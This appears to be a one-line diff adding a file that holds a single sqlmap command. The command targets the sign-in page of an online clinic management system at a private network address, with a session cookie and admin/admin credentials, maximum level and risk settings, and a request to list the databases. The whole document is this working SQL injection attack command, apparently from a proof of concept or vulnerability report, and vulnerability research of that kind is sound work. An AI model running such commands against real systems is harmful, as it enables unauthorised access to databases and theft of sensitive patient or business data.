@@ -1,0 +1,1 @@
+CLI Command: sudo sqlmap -u 192.168.0.61/ocms/index.php?signIn=1 -crawl=3 --dbms=mysql --cookie=online_clinic_management_system=hl6aaf2t1hc2i6runicnmscrmn --dbs --data="user=admin&password=admin" --level=5 --risk=3
